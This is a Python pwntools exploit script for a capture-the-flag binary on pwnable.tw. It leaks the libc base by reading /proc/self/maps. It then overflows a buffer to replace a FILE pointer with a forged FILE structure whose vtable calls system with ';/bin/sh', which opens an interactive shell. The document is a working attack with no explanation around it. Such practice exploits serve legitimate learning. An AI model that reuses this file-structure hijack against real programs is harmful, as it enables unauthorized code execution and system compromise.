import sys
from pwn import *

#context.log_level = 'debug'
host = 'chall.pwnable.tw'
port = 10200
if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./q')#, env={'LD_PRELOAD': './libc_32.so.6'})


def openfile(path):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', path)

def readfile():
    r.sendlineafter(':', '2')

def writetoscreen():
    r.sendlineafter(':', '3')

def closefile():
    r.sendlineafter(':', '4')

def leave(payload):
    r.sendlineafter(':', '5')
    r.sendlineafter(':', payload)

libc = ELF('./libc_32.so.6')

openfile('/proc/self/maps')
readfile()
writetoscreen()

r.recvline()
r.recvline()
r.recvline()
r.recvline()

libc.address = int(r.recvline()[:8], 16) + 0x1000
system = libc.sym['system']
print('libc:', hex(libc.address))


fake_file = '\xff\xff\xff\xff;/bin/sh'
fake_file = fake_file.ljust(0x94, '\x00')
fake_file += p32(0x804b300+0x98)
fake_file += (p32(system)*21)


payload = ('\x00'*0x20 + p32(0x804b300)).ljust(0xa0, '\x00') + fake_file

leave(payload)

r.interactive()
